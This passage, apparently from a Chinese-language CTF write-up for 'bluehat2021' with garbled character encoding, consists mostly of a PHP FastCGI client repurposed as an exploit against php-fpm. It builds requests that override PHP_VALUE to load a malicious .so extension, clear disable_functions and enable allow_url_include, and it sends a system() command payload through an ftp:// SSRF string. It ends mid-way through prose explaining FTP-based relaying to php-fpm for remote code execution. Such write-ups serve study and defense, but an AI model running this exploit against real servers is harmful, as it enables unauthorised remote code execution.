punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Decode a FastCGI Packet     *     * @param String $data String containing all the packet     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a FastCGI Packet     *     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$len</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get Informations on the FastCGI application     *     * @param array $requestedInfo information to retrieve     * @return array     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getValues</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Execute a request to the FastCGI application     *     * @param array $params Array of parameters     * @param String $stdin Content     * @return String     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token comment">//        $this->connect();</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$paramsRequest</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'?file=ftp://ip:9999/&amp;data='</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        fwrite($this->_sock, $request);</span><span class="token comment">//        do &#123;</span><span class="token comment">//            $resp = $this->readPacket();</span><span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span><span class="token comment">//                $response .= $resp['content'];</span><span class="token comment">//            &#125;</span><span class="token comment">//        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span><span class="token comment">//        var_dump($resp);</span><span class="token comment">//        if (!is_array($resp)) &#123;</span><span class="token comment">//            throw new Exception('Bad request');</span><span class="token comment">//        &#125;</span><span class="token comment">//        switch (ord($resp['content']&#123;4&#125;)) &#123;</span><span class="token comment">//            case self::CANT_MPX_CONN:</span><span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::OVERLOADED:</span><span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::UNKNOWN_ROLE:</span><span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::REQUEST_COMPLETE:</span><span class="token comment">//                return $response;</span><span class="token comment">//        &#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// real exploit start here</span><span class="token comment">//if (!isset($_REQUEST['cmd'])) &#123;</span><span class="token comment">//    die("Check your input\n");</span><span class="token comment">//&#125;</span><span class="token comment">//if (!isset($_REQUEST['filepath'])) &#123;</span><span class="token comment">//    $filepath = __FILE__;</span><span class="token comment">//&#125;else&#123;</span><span class="token comment">//    $filepath = $_REQUEST['filepath'];</span><span class="token comment">//&#125;</span><span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token punctuation">.</span><span class="token single-quoted-string string">'?'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'command=whoami'</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span> <span class="token comment">// php payload -- Doesnt do anything</span><span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span> <span class="token comment">// extension_dirå³ä¸º.soæ–‡ä»¶æ‰€åœ¨ç›®å½•</span><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token single-quoted-string string">'GATEWAY_INTERFACE'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'FastCGI/1.0'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REQUEST_METHOD'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'POST'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SCRIPT_FILENAME'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SCRIPT_NAME'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$req</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'QUERY_STRING'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'command=whoami'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REQUEST_URI'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$uri</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'DOCUMENT_URI'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$req</span><span class="token punctuation">,</span><span class="token shell-comment comment">#'DOCUMENT_ROOT'     => '/',</span>    <span class="token single-quoted-string string">'PHP_VALUE'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_SOFTWARE'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REMOTE_ADDR'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REMOTE_PORT'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'9001'</span><span class="token punctuation">,</span> <span class="token comment">// æ‰¾å‡†æœåŠ¡ç«¯å£</span>    <span class="token single-quoted-string string">'SERVER_ADDR'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_PORT'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'80'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_NAME'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_PROTOCOL'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'HTTP/1.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'CONTENT_LENGTH'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($_REQUEST);</span><span class="token comment">// print_r($params);</span><span class="token comment">//echo "Call: $uri\n\n";</span><span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>è®¿é—®æ‹¿åˆ°payload</p><img src="/article/bluehat2021/image-20210503143546020.png" class="" title="fastpayload" loading="lazy"><h3 id="åˆ©ç”¨-ftp-ä¸-php-fpm-å¯¹è¯-RCE"><a href="#åˆ©ç”¨-ftp-ä¸-php-fpm-å¯¹è¯-RCE" class="headerlink" title="åˆ©ç”¨ ftp ä¸ php-fpm å¯¹è¯ RCE"></a>åˆ©ç”¨ ftp ä¸ php-fpm å¯¹è¯ RCE</h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå¦‚æœå¯ä»¥å°†ä»»æ„äºŒè¿›åˆ¶æ•°æ®åŒ…å‘é€åˆ° php-fpm æœåŠ¡ï¼Œåˆ™å¯ä»¥æ‰§è¡Œä»£ç ã€‚ æ­¤æŠ€æœ¯é€šå¸¸ä¸ <code>gopher://</code> åè®®ç»“åˆä½¿ç”¨ï¼ˆssrfï¼‰ï¼Œè¯¥åè®®å— curl æ”¯æŒï¼Œ<strong>ä½†ä¸å— php æ”¯æŒ</strong>ã€‚</p><p> <a href="https://www.php.net/manual/zh/wrappers.php#wrappers">phpæ”¯æŒçš„åè®®å’Œå°è£…åè®®</a> å¯ä»£æ›¿å‘äºŒè¿›åˆ¶åŒ…çš„åè®®åªæœ‰<code>ftp://</code> ï¼Œå†µä¸” ftp æœ¬èº«ä¹Ÿæ˜¯åŸºäº tcp çš„æœåŠ¡ï¼Œèƒ½é…åˆ php-fpm è¿›è¡Œ tcp é€šä¿¡ã€‚</p><blockquote><p><strong>ftp çš„ä¸¤ç§ä¼ è¾“æ¨¡å¼</strong></p><p>ftp æœ‰ä¸¤ç§ä½¿ç”¨æ¨¡å¼ï¼šä¸»åŠ¨æ¨¡å¼ï¼ˆportï¼‰å’Œè¢«åŠ¨æ¨¡å¼ï¼ˆpasvï¼‰ã€‚</p><p>port è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯åŒæ—¶æ‰“å¼€å¹¶ä¸”ç›‘å¬ä¸€ä¸ªç«¯å£ä»¥åˆ›å»ºè¿æ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ç”±äºå®‰è£…äº†é˜²ç«å¢™ä¼šäº§ç”Ÿä¸€äº›é—®é¢˜ï¼Œè¿æ¥æœ‰æ—¶å€™ä¼šè¢«å®¢æˆ·ç«¯çš„é˜²ç«å¢™é˜»æ­¢ã€‚æ‰€ä»¥ï¼Œåˆ›ç«‹äº† pasv ã€‚pasv åªè¦æ±‚æœåŠ¡å™¨ç«¯äº§ç”Ÿä¸€ä¸ªç›‘å¬ç›¸åº”ç«¯å£çš„è¿›ç¨‹ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡å®¢æˆ·ç«¯å®‰è£…äº†é˜²ç«å¢™çš„é—®é¢˜ã€‚</p><p>ftp å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´éœ€è¦å»ºç«‹ä¸¤æ¡ tcp è¿æ¥ï¼Œä¸€æ¡æ˜¯æ§åˆ¶è¿æ¥ï¼ˆ 21 ç«¯å£ï¼‰ï¼Œç”¨æ¥å‘é€æ§åˆ¶æŒ‡ä»¤ï¼Œå¦å¤–ä¸€æ¡æ˜¯æ•°æ®è¿æ¥ï¼ˆ 20 ç«¯å£ / éšæœºç«¯å£ï¼‰ï¼ŒçœŸæ­£çš„æ–‡ä»¶ä¼ è¾“æ˜¯é€šè¿‡æ•°æ®è¿æ¥æ¥å®Œæˆçš„ã€‚</p><p><strong>ä¸¤ç§ä¼ è¾“æ¨¡å¼çš„å¼‚åŒ</strong></p><p>å¯¹äºä¸¤ç§ä¼ è¾“æ¨¡å¼æ¥è¯´ï¼Œæ§åˆ¶è¿æ¥çš„å»ºç«‹è¿‡ç¨‹éƒ½æ˜¯ä¸€æ ·ï¼Œå‡ä¸ºæœåŠ¡å™¨ç›‘å¬ 21 å·ç«¯å£ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨çš„è¯¥ç«¯å£å‘èµ· tcp è¿æ¥ã€‚</p><p>ä¸¤ç§ä¼ 